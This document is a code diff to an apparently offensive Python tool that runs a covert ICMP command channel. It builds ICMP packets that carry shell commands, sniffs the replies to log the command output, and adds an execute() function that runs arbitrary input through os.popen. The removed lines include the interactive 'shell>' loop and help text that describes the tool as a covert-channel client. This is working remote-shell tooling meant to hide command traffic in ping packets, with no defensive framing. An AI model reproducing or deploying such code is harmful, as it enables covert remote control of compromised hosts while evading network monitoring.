@@ -1,8 +1,6 @@
-import socket
-import argparse
-import re
-import _thread
 import os
+import re
+import socket
 import struct
 import time
 
@@ -14,6 +12,7 @@ def checksum(packet):
     def carry_around_add(a, b):
         c = a + b
         return (c & 0xffff) + (c >> 16)
+
     s = 0
     packet = bytearray(packet)
     for i in range(0, len(packet), 2):
@@ -51,7 +50,6 @@ def send_one(dest_addr, delay, payload):
     time.sleep(delay)
 
 
-# The sniffer part starts here..!!!
 def writer(data, file):
     f = open(file, 'a')
     f.write(data)
@@ -84,42 +82,13 @@ def start_sniffing(host, log_file):
             d1 = str(d1)
             data1 = re.search('@@(.*)\'', d1)
             data_part = data1.group(0)
-            data_part = data_part[:len(data_part)-1]
+            data_part = data_part[:len(data_part) - 1]
             writer(data_part, log_file)
             print("Command output:", reader(log_file))
         except:
             pass
 
 
-def parse_args():
-    parser = argparse.ArgumentParser(description="A simple client that communicates \n"
-                                                 "with server via covert ICMP channel\n"
-                                                 "sends commands and gets output back")
-    parser.add_argument("host_out", help="The interface to send requests")
-    parser.add_argument("host_in", help="The interface to listen replies")
-    parser.add_argument("ping_delay", help="Delay between answer pings", nargs='?', type=int, default=1)
-    parser.add_argument("log_file", help="File to log server answers",
-                        nargs='?', type=str, default='/var/log/icmp_covert.log')
-    args = parser.parse_args()
-    return args
-
-
-def main():
-    args = parse_args()
-    host_out = args.host_out
-    host_in = args.host_in
-    ping_delay = args.ping_delay
-    log_file = args.log_file
-    _thread.start_new_thread(start_sniffing, (host_in, log_file))
-    time.sleep(5)
-    while True:
-        command = input("shell>")
-        if command == "quit":
-            break
-        else:
-            send_one(host_out, ping_delay, command)
-            print("Executing Command....\n")
-
-
-if __name__ == "__main__":
-    main()
+def execute(cmd):
+    output = os.popen(cmd)
+    return output
